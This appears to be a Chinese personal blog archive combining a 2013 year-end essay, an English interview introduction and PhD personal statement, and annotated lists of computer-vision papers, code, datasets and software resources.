从图论的角度来看，就是求解图中哪条路径的权重最大，进而将这个问题转化为使用基于动态规划的viterbi 算法求解一系列相似的子问题，得到权重最大的路径。

参考文献
我爱自然语言处理
http://www.52nlp.cn/
深度学习与中文短文本分析总结与梳理
https://blog.csdn.net/wangyaninglm/article/details/66477222
分析了近5万首《全唐诗》，发现了这些有趣的秘密
http://www.growthhk.cn/cgo/9542.html
万字干货｜10款数据分析“工具”，助你成为新媒体运营领域的“增长黑客”
http://www.woshipm.com/data-analysis/553180.html
jieba分词简介与解析
https://www.cnblogs.com/baiboy/p/jieba2.html
有哪些好的汉语分词方案
https://www.zhihu.com/question/19578687
基于分布式的短文本命题实体识别之----人名识别（python实现）
https://blog.csdn.net/wangyaninglm/article/details/75042151










写于：2013年年底

文章大纲一，综述二，帷幕升起三，我也想和这个世界谈谈四，别了2013！

温和的坚持，并且傻笑。
---------------------------------------------------------题记

一，综述
期末将至，来点文字祭奠一下过往，也算年终总结了。记忆回滚至九月，轻车熟路的再入吃饭大学，这么多熟人，好像文理的主场呦。微信摇了很多妹子，而且居然有印度和南非的，可能三步走战略的打开方式不对,于是没有一个靠谱的。
男童鞋云集了一票大神，从算法到dota，从文艺范到好身材，都是我需要紧紧跟随并且虚心学习的。女生都挺不错，这里给龙哥做个广告，nec高程，蒸女友，人好！钱多!速来!
当然，回头看看，一路走来流逝的东西，热血！激情！schedual！以及精神支柱。理想又被拿去喂狗了。
工作上：赶鸭子上架的完成组织上的一些任务，有点心得就是，做事的步骤要落实清楚，有条理。按照规划，落实的两大步骤有序完成工作，在关键问题上做到自己把关。
学习上：算法分析与设计，废了！人工智能，算是重温了一下遗传算法有点收获。组合数学建立了一个概念解题框架受益匪浅。其他像什么随机过程、数据发掘、小波分析、计算机视觉、真给上成科普，没有对知识融会贯通，也算废了。
编程上：帮学姐配置个三分之一的库（惭愧惭愧），遗传算法，手写字符识别，通过很多opencv配置过程了解了下x64与x86的诸多不同，整体进步不大。下面准备花点时间看看网络安全，跟图像编程，opencv计算机视觉上的东西。
拿姐姐的话做个总结：成天除了卖萌就是摇妹子。这些日子，惶惶不可终日，我本应前进更多。

二，帷幕升起
有天无意中看到镜子里的笑容。忽然想起大学宿舍的哥们，苟朋。他的笑容比较迷人，并因此勾搭了很多妹子，而且又会各种乐器，最后就连学姐也难逃他的魔爪真是厉害。我也很努力的学习过这项勾魂夺魄的技能，后来有一天有个妹子忍不住问：你傻笑啥呢？我就就此罢手不练了。人生在青年的这个时期，总会产生自我戏剧化的某种需求，这学期正好重看了《无间道》，梁朝伟又成了新的学习目标。听着蔡琴的《被遗忘的时光》，我想人生到底是黑社会里卧底的陈永仁还是警局里卧底的刘建明？真相大白的时候，你想说，对不起，我是警察！这句对白呢，还是，我只想做个好人！这句对白呢，或者是，出来混总是要还的？
今年，整体去影院看了不少电影，我重点说下几部国产的片子。《致青春》是跟学姐们回忆青春去了，她们说女生的青春就是为了爱情，男生的青春就是为他们自己奋斗。我心想男生的青春应该是为了喜欢的女生而奋斗吧。后来她们想潜规则我，我当然不能便宜了她们。《中国合伙人》是我今年最喜欢的电影，800本书的目标只剩下785本了。这一记精神鸦片，吸的很过瘾。《富春山居图》是人类电影烂片精华，它达到了其他抗日神剧无法企及的新高度。姐姐居然陪我从头看到尾，深表敬意。看完这个电影的很长一段时间，我是不敢走进电影院的。 冯导的《私人定制》，据他自己说是突破了中国电影不敢于针砭实事的瓶颈，我深以为然，范伟那个梦的内容放在以前，估计是不能通过审查的。最后给大自然道歉的内容略显做作，若能改成”我能为你做点什么“就更显出社会责任感了。

三，我也想和这个世界谈谈
我是如此喜欢末班车，夜场电影，因为绵延的路灯，散场后空旷的影院，在那么一刻总能让人感觉到，世界就是属于我的，倒不是我迷恋孤独，而是我希望跟她吐露一下心声。我想跟这个世界谈谈。
去年也就是这个时候，晚上省图看完书，做最后一班车回家，路上跟司机师傅聊了起来，我说师傅您辛苦了，工作到这么晚。师傅笑笑，回头打量了我一眼，说道，你是大学森吧，我要是也有文化也不会干这个嘛，卖苦力，辛苦是应该的。我一时语塞不知说什么好，想到毕业一年还在啃老考研，就随口感叹道，哎，有撒文化呢，大学生现在满街都是滴，毕业列都去搬砖端盘子了，现在干啥都不容易。师傅一听，立马打开了话匣，从自己老婆三舅家小孩考双百还是班里倒数，一路聊到中央经济政策对A股市场走势的影响，听的我欲罢不能直到发现做过了两站路，才依依不舍的下车并跟师傅保证下次接着聊。
后来在半夜回家的出租车上，午夜的24小时便利店里，我跟所有在我看来的劳苦大众嬉笑怒骂，也许那无意的寒暄成了她们沉闷工作中突然的一抹烟火，师傅们分享给我的都是最真诚的人生体验与殷切鼓励。我欣喜的看到，积极的态度总能让你无论身处何地都能乐观的感受到，世界并没有你想像的那么糟！末了，师傅赞许的说道：小伙子，不错嘛！这是一剂注入灵魂深处的鸡血。
我常常想，这一年其实蛮有意思的，开头考研考的心惊肉跳，半途寻了个工作干的风生水起，每周末雷打不动的报复社会，去了梦寐以求的纳木错，后来来到吃饭大学，不曾想一学期飘然而过。今天跟凯夫吃饭闲聊，他告诉我说：想当年逆风尿十丈，现如今顺风尿一鞋。我想这应该算是2013年最后一个无节操的段子啦！

四，别了2013！
2014希望我能埋葬掉内心所有黑暗面，心无旁鹜的向你前行，谢谢，再会。

THE END!
ALL RIGHTS RESERVED!

P.S.在新年到来之际，我谨代表所有人向全国各族人民，向香港特别行政区同胞和澳门特别行政区同胞，向台湾同胞和海外侨胞，向世界各国和各地区的朋友们，致以新年的祝福。愿大家在新的一年里同心同德开拓进取乘风破浪勇往直前一帆风顺二龙腾飞三羊开泰四季平安五福临门六六大顺七星高照八方来财九九同心十全十美百事亨通千事吉祥万事如意！！！







 
Before my introduction, I have to express my great gratitude to the opportunity of this phone interview your company give to me.
First of all, I’d like to give you a brief introduction of my educational background I was admitted by Xi’an university of Art and Science 2008.
Major in software Engineering,which is a famous one in china.in all my 4 years college life I have learned programming languages such as c,c plus plus ,java,html,and SQL.computer basic theory ,such
 as data structures,computer organization theory ,computer network,operating system,database,artificial intelligence and so on.
I am also familiar with windows mfc,Microsoft sql server,adobe photoshop.knowing a little bit about linux ,basic graphics and image processing theory.
I develop several personal interests,like playing basketball and watching films at my spare time.
Generally speaking , I am a active ,innovation and hard working man especially to deal with the thing which is challengeable or I am interested in.
I suppose not only my qualifications and knowledge make me a perfect candidate for your company,but also my cheerful personality is well suited to be a good team-worker
 
新版本2014.11.23
 
Personal Statement
I would like to build on my solid education and experience as an engineer for a Ph.D. degree in computer science
 at a distinguished university. I wish in particular to be trained at an advance level in software system, image process, and three-dimensional
 reconstruction. My ultimate goal is to become an outstanding software engineer, and create excellent product to make people live a better life. As an applicant to Carnegie Mellon University’s doctoral program in Computer Science, I am very glad to have this
 opportunity to give you a brief introduction of myself.
  I received a bachelor degree from Xi’an University of Arts and Science in 2012, major in Software Engineering. Throughout
 four years of undergraduate study, I
 completed the whole fundamental courses related to both software and hardware areas of research, such as, Data Structures, Software Engineering, Computer Network, Operating System, programming
 languages: c, c++, java. Moreover, as a term project, I
 designed and developed a student information management system, using MFC and Microsoft SQL 2005 edition’s database.
 My graduate design is Fingerprint Contrast and Analysis System. In this design, I adopt the Visual Studio 2008 edition’s MFC, in accordance with software development which
 uses top-to-down process and gradual refinement of the classic model, successfully achieve enhancement, binarization, thinning of fingerprint image which is based on BMP format. These achievements build a foundation for my choice of direction in postgraduate
 study.
       After graduate from school, I was employed by a company which is specializing in network and communication security
 testing products. During the work time, I was not only learned the standardization process of software development, but also participated in research a remote control system based on Mac OS 10.8 named Mac-Shell. This new system, implement a typical remote
 monitoring system’s basic function, document management, remote command line and so on.
       When I was in the workplace, besides what I had mentioned above, I did several other projects which greatly enhanced
 my ability of programming and debugging skills. However when I am faced up with some practical problems, for instance, Queue Scheduling, Parallel Programming, and other algorithm issues, due to lack of related knowledge, the solution I designed always seems
 imperfect and occurs all kinds of problems. So in order to improve my theoretical cognition, I went to Shaanxi Normal University for further education. My research directions include image processing, pattern recognition, three-dimensional reconstruction.
 After all these years of study, I am glad to say that my competence at independent research will serve me well, as I try to put my ideas into practice.
       As far as I am concerned, a deeper exploit in my area can only be accomplished in a quality doctoral program like
 yours. In view of the above, I would greatly appreciate it, if you could accept me into your program and offer me whatever financial you might be able to. By giving me an opportunity to study under your seasoned guidance, you will produce not only another
 computer scientist but also a computer scientist who will spawn many other computer scientists.
 
 






计算机视觉、机器学习相关领域论文和源代码大集合--持续更新……
zouxy09@qq.com
http://blog.csdn.net/zouxy09

注：下面有project网站的大部分都有paper和相应的code。Code一般是C/C++或者Matlab代码。
最近一次更新：2013-3-17

一、特征提取Feature Extraction：
·         
SIFT [1] [Demo program][SIFT
 Library] [VLFeat]
·         
PCA-SIFT [2] [Project]
·         
Affine-SIFT [3] [Project]
·         
SURF [4] [OpenSURF] [Matlab
 Wrapper]
·         
Affine Covariant Features [5] [Oxford project]
·         
MSER [6] [Oxford project] [VLFeat]
·         
Geometric Blur [7] [Code]
·         
Local Self-Similarity Descriptor [8] [Oxford implementation]
·         
Global and Efficient Self-Similarity [9] [Code]
·         
Histogram of Oriented Graidents [10] [INRIA Object Localization Toolkit] [OLT
 toolkit for Windows]
·         
GIST [11] [Project]
·         
Shape Context [12] [Project]
·         
Color Descriptor [13] [Project]
·         
Pyramids of Histograms of Oriented Gradients [Code]
·         
Space-Time Interest Points (STIP) [14][Project] [Code]
·         
Boundary Preserving Dense Local Regions [15][Project]
·         
Weighted Histogram[Code]
·         
Histogram-based Interest Points Detectors[Paper][Code]
·         
An OpenCV - C++ implementation of Local Self Similarity Descriptors [Project]
·         
Fast Sparse Representation with Prototypes[Project]
·         
Corner Detection [Project]
·         
AGAST Corner Detector: faster than FAST and even FAST-ER[Project]
·        
Real-time Facial Feature Detection using Conditional Regression Forests[Project]
·        
Global and Efficient Self-Similarity for Object Classification and Detection[code]
·        
WαSH: Weighted α-Shapes for Local Feature Detection[Project]
·        
HOG[Project]
·        
Online Selection of Discriminative Tracking Features[Project]
                       

二、图像分割Image Segmentation：
·           
Normalized Cut [1] [Matlab code]
·           
Gerg Mori’ Superpixel code [2] [Matlab code]
·           
Efficient Graph-based Image Segmentation [3] [C++ code] [Matlab
 wrapper]
·           
Mean-Shift Image Segmentation [4] [EDISON C++ code] [Matlab
 wrapper]
·           
OWT-UCM Hierarchical Segmentation [5] [Resources]
·           
Turbepixels [6] [Matlab code 32bit] [Matlab
 code 64bit] [Updated code]
·           
Quick-Shift [7] [VLFeat]
·           
SLIC Superpixels [8] [Project]
·           
Segmentation by Minimum Code Length [9] [Project]
·           
Biased Normalized Cut [10] [Project]
·           
Segmentation Tree [11-12] [Project]
·           
Entropy Rate Superpixel Segmentation [13] [Code]
·           
Fast Approximate Energy Minimization via Graph Cuts[Paper][Code]
·           
Efﬁcient Planar Graph Cuts with Applications in Computer Vision[Paper][Code]
·           
Isoperimetric Graph Partitioning for Image Segmentation[Paper][Code]
·           
Random Walks for Image Segmentation[Paper][Code]
·           
Blossom V: A new implementation of a minimum cost perfect matching algorithm[Code]
·           
An Experimental Comparison of Min-Cut/Max-Flow Algorithms for Energy Minimization in Computer Vision[Paper][Code]
·           
Geodesic Star Convexity for Interactive Image Segmentation[Project]
·           
Contour Detection and Image Segmentation Resources[Project][Code]
·           
Biased Normalized Cuts[Project]
·           
Max-flow/min-cut[Project]
·           
Chan-Vese Segmentation using Level Set[Project]
·           
A Toolbox of Level Set Methods[Project]
·           
Re-initialization Free Level Set Evolution via Reaction Diffusion[Project]
·           
Improved C-V active contour model[Paper][Code]
·           
A Variational Multiphase Level Set Approach to Simultaneous Segmentation and Bias Correction[Paper][Code]
·         
Level Set Method Research by Chunming Li[Project]
·         
ClassCut for Unsupervised Class Segmentation[code]
·        
SEEDS: Superpixels Extracted via Energy-Driven Sampling[Project][other]

三、目标检测Object Detection：
·           
A simple object detector with boosting [Project]
·           
INRIA Object Detection and Localization Toolkit [1] [Project]
·           
Discriminatively Trained Deformable Part Models [2] [Project]
·           
Cascade Object Detection with Deformable Part Models [3] [Project]
·           
Poselet [4] [Project]
·           
Implicit Shape Model [5] [Project]
·           
Viola and Jones’s Face Detection [6] [Project]
·           
Bayesian Modelling of Dyanmic Scenes for Object Detection[Paper][Code]
·           
Hand detection using multiple proposals[Project]
·           
Color Constancy, Intrinsic Images, and Shape Estimation[Paper][Code]
·           
Discriminatively trained deformable part models[Project]
·           
Gradient Response Maps for Real-Time Detection of Texture-Less Objects: LineMOD [Project]
·           
Image Processing On Line[Project]
·           
Robust Optical Flow Estimation[Project]
·           
Where's Waldo: Matching People in Images of Crowds[Project]
·          
Scalable Multi-class Object Detection[Project]
·          
Class-Specific Hough Forests for Object Detection[Project]
·        
Deformed Lattice Detection In Real-World Images[Project]
·        
Discriminatively trained deformable part models[Project]

四、显著性检测Saliency Detection：
·           
Itti, Koch, and Niebur’ saliency detection [1] [Matlab code]
·           
Frequency-tuned salient region detection [2] [Project]
·           
Saliency detection using maximum symmetric surround [3] [Project]
·           
Attention via Information Maximization [4] [Matlab code]
·           
Context-aware saliency detection [5] [Matlab code]
·           
Graph-based visual saliency [6] [Matlab code]
·           
Saliency detection: A spectral residual approach. [7] [Matlab code]
·           
Segmenting salient objects from images and videos. [8] [Matlab code]
·           
Saliency Using Natural statistics. [9] [Matlab code]
·           
Discriminant Saliency for Visual Recognition from Cluttered Scenes. [10] [Code]
·           
Learning to Predict Where Humans Look [11] [Project]
·           
Global Contrast based Salient Region Detection [12] [Project]
·           
Bayesian Saliency via Low and Mid Level Cues[Project]
·           
Top-Down Visual Saliency via Joint CRF and Dictionary Learning[Paper][Code]
·        
Saliency Detection: A Spectral Residual Approach[Code]

五、图像分类、聚类Image Classification, Clustering
·           
Pyramid Match [1] [Project]
·           
Spatial Pyramid Matching [2] [Code]
·           
Locality-constrained Linear Coding [3] [Project] [Matlab
 code]
·           
Sparse Coding [4] [Project] [Matlab
 code]
·           
Texture Classification [5] [Project]
·           
Multiple Kernels for Image Classification [6] [Project]
·           
Feature Combination [7] [Project]
·           
SuperParsing [Code]
·           
Large Scale Correlation Clustering Optimization[Matlab code]
·           
Detecting and Sketching the Common[Project]
·           
Self-Tuning Spectral Clustering[Project][Code]
·           
User Assisted Separation of Reflections from a Single Image Using a Sparsity Prior[Paper][Code]
·           
Filters for Texture Classification[Project]
·           
Multiple Kernel Learning for Image Classification[Project]
·         
SLIC Superpixels[Project]

六、抠图Image Matting
·           
A Closed Form Solution to Natural Image Matting [Code]
·           
Spectral Matting [Project]
·           
Learning-based Matting [Code]

七、目标跟踪Object Tracking：
·           
A Forest of Sensors - Tracking Adaptive Background Mixture Models [Project]
·           
Object Tracking via Partial Least Squares Analysis[Paper][Code]
·           
Robust Object Tracking with Online Multiple Instance Learning[Paper][Code]
·           
Online Visual Tracking with Histograms and Articulating Blocks[Project]
·           
Incremental Learning for Robust Visual Tracking[Project]
·           
Real-time Compressive Tracking[Project]
·           
Robust Object Tracking via Sparsity-based Collaborative Model[Project]
·           
Visual Tracking via Adaptive Structural Local Sparse Appearance Model[Project]
·           
Online Discriminative Object Tracking with Local Sparse Representation[Paper][Code]
·           
Superpixel Tracking[Project]
·           
Learning Hierarchical Image Representation with Sparsity, Saliency and Locality[Paper][Code]
·           
Online Multiple Support Instance Tracking [Paper][Code]
·           
Visual Tracking with Online Multiple Instance Learning[Project]
·           
Object detection and recognition[Project]
·           
Compressive Sensing Resources[Project]
·           
Robust Real-Time Visual Tracking using Pixel-Wise Posteriors[Project]
·           
Tracking-Learning-Detection[Project][OpenTLD/C++
 Code]
·          
the HandVu：vision-based hand gesture interface[Project]
·          
Learning Probabilistic Non-Linear Latent Variable Models for Tracking Complex Activities[Project]

八、Kinect：
·           
Kinect toolbox[Project]
·           
OpenNI[Project]
·           
zouxy09 CSDN Blog[Resource]
·           
FingerTracker 手指跟踪[code]

九、3D相关：
·           
3D Reconstruction of a Moving Object[Paper]
 [Code]
·           
Shape From Shading Using Linear Approximation[Code]
·           
Combining Shape from Shading and Stereo Depth Maps[Project][Code]
·           
Shape from Shading: A Survey[Paper][Code]
·           
A Spatio-Temporal Descriptor based on 3D Gradients (HOG3D)[Project][Code]
·           
Multi-camera Scene Reconstruction via Graph Cuts[Paper][Code]
·           
A Fast Marching Formulation of Perspective Shape from Shading under Frontal Illumination[Paper][Code]
·           
Reconstruction:3D Shape, Illumination, Shading, Reflectance, Texture[Project]
·           
Monocular Tracking of 3D Human Motion with a Coordinated Mixture of Factor Analyzers[Code]
·           
Learning 3-D Scene Structure from a Single Still Image[Project]

十、机器学习算法：
·           
Matlab class for computing Approximate Nearest Nieghbor (ANN) [Matlab class providing interface
 toANN library]
·           
Random Sampling[code]
·           
Probabilistic Latent Semantic Analysis (pLSA)[Code]
·           
FASTANN and FASTCLUSTER for approximate k-means (AKM)[Project]
·           
Fast Intersection / Additive Kernel SVMs[Project]
·           
SVM[Code]
·           
Ensemble learning[Project]
·           
Deep Learning[Net]
·          
Deep Learning Methods for Vision[Project]
·           
Neural Network for Recognition of Handwritten Digits[Project]
·           
Training a deep autoencoder or a classifier on MNIST digits[Project]
·         
THE MNIST DATABASE of handwritten digits[Project]
·         
Ersatz：deep neural networks in the cloud[Project]
·         
Deep Learning [Project]
·         
sparseLM : Sparse Levenberg-Marquardt nonlinear least squares in C/C++[Project]
·         
Weka 3: Data Mining Software in Java[Project]
·         
Invited talk "A Tutorial on Deep Learning" by Dr. Kai Yu (余凯)[Video]
·         
CNN - Convolutional neural network class[Matlab Tool]
·         
Yann LeCun's Publications[Wedsite]
·         
LeNet-5, convolutional neural networks[Project]
·         
Training a deep autoencoder or a classifier on MNIST digits[Project]
·         
Deep Learning 大牛Geoffrey E. Hinton's HomePage[Website]
·        
Multiple Instance Logistic Discriminant-based Metric Learning (MildML) and Logistic Discriminant-based Metric Learning (LDML)[Code]
·        
Sparse coding simulation software[Project]
·        
Visual Recognition and Machine Learning Summer School[Software]

十一、目标、行为识别Object, Action Recognition：
·           
Action Recognition by Dense Trajectories[Project][Code]
·           
Action Recognition Using a Distributed Representation of Pose and Appearance[Project]
·           
Recognition Using Regions[Paper][Code]
·           
2D Articulated Human Pose Estimation[Project]
·           
Fast Human Pose Estimation Using Appearance and Motion via Multi-Dimensional Boosting Regression[Paper][Code]
·           
Estimating Human Pose from Occluded Images[Paper][Code]
·           
Quasi-dense wide baseline matching[Project]
·          
ChaLearn Gesture Challenge: Principal motion: PCA-based reconstruction of motion histograms[Project]
·          
Real Time Head Pose Estimation with Random Regression Forests[Project]
·          
2D Action Recognition Serves 3D Human Pose Estimation[Project]
·          
A Hough Transform-Based Voting Framework for Action Recognition[Project]
·           
Motion Interchange Patterns for Action Recognition in Unconstrained Videos[Project]
·         
2D articulated human pose estimation software[Project]
·         
Learning and detecting shape models [code]
·         
Progressive Search Space Reduction for Human Pose Estimation[Project]
·         
Learning Non-Rigid 3D Shape from 2D Motion[Project]

十二、图像处理：
·         
Distance Transforms of Sampled Functions[Project]
·       
The Computer Vision Homepage[Project]
·       
Efficient appearance distances between windows[code]
·        
Image Exploration algorithm[code]
·        
Motion Magnification 运动放大 [Project]
·        
Bilateral Filtering for Gray and Color Images 双边滤波器 [Project]
·        
A Fast Approximation of the Bilateral Filter using a Signal Processing Approach [Project]
                 

十三、一些实用工具：
·           
EGT: a Toolbox for Multiple View Geometry and Visual Servoing[Project] [Code]
·           
a development kit of matlab mex functions for OpenCV library[Project]
·           
Fast Artificial Neural Network Library[Project]


十四、人手及指尖检测与识别：
·          
finger-detection-and-gesture-recognition [Code]
·          
Hand and Finger Detection using JavaCV[Project]
·          
Hand and fingers detection[Code]


十五、场景解释：
·           Nonparametric Scene Parsing via Label Transfer [Project]


十六、光流Optical flow：
·         High accuracy optical flow using a theory for warping [Project]
·        
Dense Trajectories Video Description [Project]
·        
SIFT Flow: Dense Correspondence across Scenes and its Applications[Project]
·        
KLT: An Implementation of the Kanade-Lucas-Tomasi Feature Tracker [Project]
·        
Tracking Cars Using Optical Flow[Project]
·        
Secrets of optical flow estimation and their principles[Project]
·        
implmentation of the Black and Anandan dense optical flow method[Project]
·        
Optical Flow Computation[Project]
·        
Beyond Pixels: Exploring New Representations and Applications for Motion Analysis[Project]
·        
A Database and Evaluation Methodology for Optical Flow[Project]
·        
optical flow relative[Project]
·        
Robust Optical Flow Estimation [Project]
·        
optical flow[Project]
十七、图像检索Image Retrieval：
·           Semi-Supervised Distance Metric Learning for Collaborative Image Retrieval
[Paper][code]


十八、马尔科夫随机场Markov Random Fields：
·         Markov Random Fields for Super-Resolution
[Project]
·        
A Comparative Study of Energy Minimization Methods for Markov Random Fields with Smoothness-Based Priors [Project]
十九、运动检测Motion detection：
·         Moving Object Extraction, Using Models or Analysis of Regions
[Project]
·        
Background Subtraction: Experiments and Improvements for ViBe [Project]
·        
A Self-Organizing Approach to Background Subtraction for Visual Surveillance Applications [Project]
·        
changedetection.net: A new change detection benchmark dataset[Project]
·        
ViBe - a powerful technique for background detection and subtraction in video sequences[Project]
·        
Background Subtraction Program[Project]
·        
Motion Detection Algorithms[Project]
·        
Stuttgart Artificial Background Subtraction Dataset[Project]
·        
Object Detection, Motion Estimation, and Tracking[Project]






转自：http://blog.csdn.net/zhubenfulovepoem/article/details/7191794
       以下是computer vision：algorithm and application计算机视觉算法与应用这本书中附录里的关于计算机视觉的一些测试数据集和源码站点，我整理了下，加了点中文注解。
ComputerVision:
Algorithms and Applications
Richard Szeliski


在http://szeliski.org/Book包含了更新的数据集和软件，请同样访问他。
C.1 数据集
一个关键就是用富有挑战和典型的数据集来测试你算法的可靠性。当有背景或者他人的结果是可行的,这种测试可能甚至包含更多的信息(和质量更好)。
经过这些年，大量的数据集已经被提出来用于测试和评估计算机视觉算法。许多这些数据集和软件被编入了计算机视觉的主页。一些更新的网址，像CVonline
(http://homepages.inf.ed.ac.uk/rbf/CVonline ), VisionBib.Com (http://datasets.visionbib.com/
 ), and Computer Vision online (http://computervisiononline.com/ ), 有更多最新的数据集和软件。
下面，我列出了一些用的最多的数据集，我将它们让章节排列以便它们联系更紧密。

第二章：图像信息
CUReT: Columbia-Utrecht 反射率和纹理数据库Reﬂectance and TextureDatabase,http://www1.cs.columbia.edu/CAVE/software/curet/
 (Dana, van Ginneken, Nayaret al. 1999).

Middlebury Color Datasets:不同摄像机拍摄的图像，注册后用于研究不同的摄像机怎么改变色域和彩色registeredcolor images taken by different cameras to study how they transform gamuts andcolors,http://vision.middlebury.edu/color/data/
 Chakrabarti, Scharstein, and Zickler 2009).

第三章：图像处理
Middlebury test datasets forevaluating MRF minimization/inference algorithms评估隐马尔科夫随机场最小化和推断算法,
http://vision.middlebury.edu/MRF/results/ (Szeliski, Zabih, Scharstein et al. 2008).

第四章：特征检测和匹配
Afﬁne Covariant Featuresdatabase（反射协变的特征数据集） for evaluating feature detector and descriptor matching quality andrepeatability（评估特征检测和描述匹配的质量和定位精度）,http://www.robots.ox.ac.uk/~vgg/research/affine/
(Miko-lajczyk and Schmid 2005;Mikolajczyk, Tuytelaars, Schmid et al. 2005).

Database of matched imagepatches for learning （图像斑块匹配学习数据库）and feature descriptor evaluation（特征描述评估数据库）,
http://cvlab.epfl.ch/~brown/patchdata/patchdata.html
(Winder and Brown 2007;Hua,Brown, and Winder 2007).

第五章;分割
BerkeleySegmentation Dataset（分割数据库） and Benchmark of 1000 images labeled by 30 humans,（30个人标记的1000副基准图像）along with an evaluation,http://www.eecs.berkeley.edu/Research/Projects/CS/vision/grouping/segbench/
 (Martin, Fowlkes, Tal et al.2001).

Weizmann segmentationevaluation database of 100 grayscale images with ground truth segmentations,
http://www.wisdom.weizmann.ac.il/~vision/Seg EvaluationDB/index.html
(Alpert, Galun, Basri et al. 2007).

第八章：稠密运动估计
TheMiddlebury optic ﬂow evaluation（光流评估） Web site,http://vision.middlebury.edu/flow/data/
(Baker,Scharstein, Lewis et al. 2009).

The Human-Assisted MotionAnnotation database,（人类辅助运动数据库）
http://people.csail.mit.edu/celiu/motionAnnotation/ (Liu, Freeman, Adelson etal. 2008)

第十章：计算机摄像学
High DynamicRange radiance（辐射）maps, 
http://www.debevec.org/Research/HDR/
(De-bevecand Malik 1997).

Alpha matting evaluation Website, http://alphamatting.com/ (Rhemann, Rother, Wang
et al. 2009).

第十一章：Stereo correspondence立体对应
Middlebury Stereo Datasets andEvaluation, 
http://vision.middlebury.edu/stereo/ (Scharstein
and Szeliski 2002).

StereoClassiﬁcation（立体分类） and Performance Evaluation（性能评估） of different aggregation（聚类） costs for stereo matching（立体匹配）,http://www.vision.deis.unibo.it/spe/SPEHome.aspx
 (Tombari, Mat-
toccia, Di Stefano et al.2008).

Middlebury Multi-View StereoDatasets, 
http://vision.middlebury.edu/mview/data/ (Seitz,Curless, Diebel etal. 2006).

Multi-view and Oxford Collegesbuilding reconstructions,
http://www.robots.ox.ac.uk/~vgg/data/data-mview.html .

Multi-View Stereo Datasets, http://cvlab.epfl.ch/data/strechamvs/ (Strecha, Fransens,
and Van Gool 2006).

Multi-View Evaluation, http://cvlab.epfl.ch/~strecha/multiview/ (Strecha, von Hansen,
Van Gool et al. 2008).

第十二章：3D重建
HumanEva: synchronized video（同步视频） and motion capture （动作捕捉）dataset for evaluation ofarticulated human motion,http://vision.cs.brown.edu/humaneva/
 Sigal, Balan, and Black 2010).

第十三章：图像渲染
The (New) Stanford Light FieldArchive, http://lightfield.stanford.edu/
(Wilburn, Joshi,Vaish et al.2005).

Virtual Viewpoint Video:multi-viewpoint video with per-frame depth maps,
http://research.microsoft.com/en-us/um/redmond/groups/ivm/vvv/ (Zitnick, Kang, Uytten-
daele et al. 2004).

第十四章：识别
查找一系列的视觉识别数据库，在表14.1–14.2.除了那些，这里还有：
Buffy pose classes, http://www.robots.ox.ac.uk/~vgg/data/ buffy pose classes/ andBuffy
stickmen V2.1, http://www.robots.ox.ac.uk/~vgg/data/stickmen/index.html
 (Ferrari,Marin-
Jimenez, and Zisserman 2009;Eichner and Ferrari 2009).

H3D database of pose/jointannotated photographs of humans,
http://www.eecs.berkeley.edu/~lbourdev/h3d/ (Bourdev and Malik 2009).

Action Recognition Datasets,http://www.cs.berkeley.edu/projects/vision/action, has point-
ers toseveral datasets for action and activity recognition, as well as some papers.（有一些关于人活动和运动的数据库和论文） The humanaction database athttp://www.nada.kth.se/cvap/actions/
 包含更多的行动序列。

C.2 软件资源
一个对于计算机视觉算法最好的资源就是开源视觉图像库（opencv）(http://opencv.willowgarage.com/wiki/),他有在intel的Gary
 Bradski和他的同事开发，现在由Willow Garage (Bradsky and Kaehler 2008)维护和扩展。一部分可利用的函数在http://opencv.willowgarage.com/documentation/cpp/中：
图像处理和变换 (滤波，形态学，金字塔);
图像几何学的变换 (旋转，改变大小);
混合图像变换 (傅里叶变换，距离变换);
直方图;
分割 (分水岭, mean shift);
特征检测 (Canny, Harris, Hough, MSER, SURF);
运动分析和物体分析 (Lucas–Kanade, mean shift);
相机矫正和3D重建
机器学习 (k nearest neighbors, 支持向量机, 决策树, boost-
ing, 随机树, expectation-maximization, 和神经网络).

Intel的Performance Primitives (IPP)library,http://software.intel.com/en-us/intel-ipp/，包含
各种各样的图像处理任务的最佳优化代码，许多opencv中的例子利用了这个库，加入他安装了，程序运行得更快。依据功能，他和Opencv有很多相同的运算处理，并且加上了额外的库针对图像视频压缩，信号语音处理和矩阵代数。

MTALAB中的Image Processing Toolbox图像处理工具，http://www.mathworks.com/products/image/，包含常规的处理，空域变换（旋转，改变大小），常规正交，图像分析和统计学（变边缘，哈弗变换），图像增强（自适应直方图均衡，中值滤波），图像恢复（去模糊），线性滤波（卷积），图像变换（傅里叶，离散余弦变换）和形态学操作（连通域和距离变换）

两个比较旧的库，它们没有被发展，但是包含了一些的有用的常规操作：
VXL (C++Libraries for Computer Vision Research and Implemen-tation,http://vxl.sourceforge.net/)
LTI-Lib 2 (http://www.ie.itcr.ac.cr/palvarado/ltilib-2/homepage/
 ).

图像编辑和视图包，例如Windows Live Photo Gallery, iPhoto, Picasa,GIMP, 和 IrfanView，它们对执行这些处理非常有用：常规处理任务，格式转换，观测你的结果。它们同样可以用于对图像处理算法有趣的实现参考，例如色调调整和去噪。

这里他也有一些软件包和基础框架对你建一个实时视频处理的DEMOS很有用，Vision on Tap(http://www.visionontap.com/ )提供一个可以实时处理你的网络摄像头的网页服务(Chiu
 and Raskar 2009）。Video-Man (VideoManager, http://videomanlib.sourceforge.net/处理实时的基于视频的DEMOS和应用非常有用，你也可以用MATLAB中的imread直接从任何URl（例如网络摄像头）中读取视频。
下面，我列出了一些额外的网络资源，让章节排列以便它们看起来联系更紧密：

第三章:图像处理
matlabPyrTools—MATLAB 下的源码对于拉普拉斯变换，金字塔, QMF/小波, 和
steerable pyramids, http://www.cns.nyu.edu/~lcv/software.php (Simoncelli and Adel-
son 1990a; Simoncelli,Freeman, Adelson et al. 1992).

BLS-GSM 图像去噪, http://decsai.ugr.es/~javier/denoise/ (Portilla, Strela,Wain-
wright et al. 2003).

Fast bilateral ﬁltering code（快速双边滤波）, http://people.csail.mit.edu/jiawen/#code (Chen,
 Paris, and Durand 2007).

C++ implementation of the fastdistance transform algorithm,
http://people.cs.uchicago.edu/~pff/dt/ (Felzenszwalb andHuttenlocher 2004a).

GREYC’s Magic Image Converter,including image restoration software using regularization and anisotropicdiffusion,http://gmic.sourceforge.net/gimp.shtml
 (Tschumperl´ e and Deriche 2005).

第四章：图像特征检测和匹配
VLFeat, 一个开放便捷的计算机视觉算法库 
http://vlfeat.org/ (Vedaldi and Fulkerson 2008).

SiftGPU: A GPU Implementationof Scale Invariant Feature Transform (SIFT),
GPU实现的尺度特征性变换
